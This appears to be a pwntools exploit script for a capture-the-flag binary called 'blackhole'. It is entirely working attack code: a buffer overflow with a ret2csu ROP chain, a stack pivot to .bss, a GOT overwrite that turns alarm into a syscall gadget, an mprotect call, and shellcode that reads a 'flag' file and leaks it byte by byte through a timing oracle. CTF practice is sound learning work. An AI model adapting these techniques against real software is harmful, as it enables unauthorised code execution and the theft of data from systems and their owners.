from pwn import *

binary = './blackhole'
elf = ELF(binary)
libc = elf.libc

io = process(binary)
context.log_level = 'debug'
#pause()

def call_func(r12, r15, r14, r13):
    buf = p64(0x400a4a)
    buf += p64(0) # rbx
    buf += p64(1) # rbp
    buf += p64(r12) # func name
    buf += p64(r13) # rdx
    buf += p64(r14) # rsi
    buf += p64(r15) # rdi
    buf += p64(0x400a30)
    buf += '0' * 56
    return buf

# prepare big rop chain, because the previous overflow size is not enough for all the
# operations

bss_addr = 0x601a00
pop_rbp = 0x4007c0
leave_ret = 0x4009a5
b = 'a' * 0x20
b += 'b' * 8
b += call_func(elf.got['read'], 0, bss_addr, 0x300)
b += p64(pop_rbp)
b += p64(bss_addr)
b += p64(leave_ret)
io.send(b)

# read ROP to it
#pause()
bss_addr2 = 0x601d00
context.arch = 'amd64'
b = '''
mov rax, 2
mov rdi, 0x601b78
mov rsi, 0
mov rdx, 0
syscall

xchg rax, rdi
xor rax, rax
mov rsi, 0x601600
mov rdx, 60
syscall

mov rcx, 0x601600
add rcx, %d
mov al, byte ptr [rcx]
cmp al, %d
jge good

bad:
mov rax, 60
syscall

good:
mov rax, 0
mov rdi, 0
mov rsi, 0x601500
mov rdx, 0x100
syscall
jmp good
'''

offset = 0
cmpval = ord('c')
SC = asm(b % (offset, cmpval))

b = p64(0) # for pop ebp in leave
b += call_func(elf.got['read'], 0, elf.got['alarm'], 1) # set the elf.got['alarm'] to syscall
b += call_func(elf.got['read'], 0, bss_addr2, 10) # set rax 10
b += call_func(elf.got['alarm'], 0x601000, 1000, 7) # mprotect()
b += p64(bss_addr + 0x200)
b += 'flag\x00'
b = b.ljust(0x200, '\x00')
b += SC
io.send(b)

# read one byte to the got
#pause()
io.send('\x05')

# read 10 bytes to set the rax
#pause()
io.send('1' * 10)

io.interactive()
